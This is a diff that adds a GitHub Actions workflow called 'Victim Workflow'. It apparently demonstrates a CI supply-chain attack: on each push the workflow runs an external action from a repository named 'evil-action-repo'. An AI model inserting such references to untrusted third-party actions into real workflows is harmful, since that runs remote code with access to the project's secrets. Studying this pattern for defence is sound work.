@@ -1,0 +1,13 @@
+name: Victim Workflow
+
+on:
+  push:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Run external action
+        uses: divyesh-0x01/evil-action-repo/.github/actions/evil@v1
